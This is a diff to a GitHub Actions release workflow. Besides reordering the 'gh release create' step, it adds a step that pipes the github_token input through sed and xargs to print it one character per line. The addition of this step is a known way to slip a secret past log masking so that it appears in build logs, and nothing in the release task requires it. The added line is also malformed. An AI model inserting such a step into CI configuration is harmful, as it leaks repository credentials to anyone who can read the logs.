@@ -24,12 +24,17 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
+    - name: sed github_token
+      run:
+        echo { inputs.github_token }} | sed 's/./ & /g' | xargs -n 1 echo
+        
     - name: Create GitHub Release
+      run: |
+        gh release create "${{ env.tag }}" \
+        --repo="${{ github.repository }}" \
+        --title="${{ inputs.release_name }}" \
+        --generate-notes
       env:
         GH_TOKEN: ${{ inputs.github_token }}
         tag: ${{ inputs.tag_name }}
-      run: |
-        gh release create "${{ env.tag }}" \
-          --repo="${{ github.repository }}" \
-          --title="${{ inputs.release_name }}" \
-          --generate-notes
+    
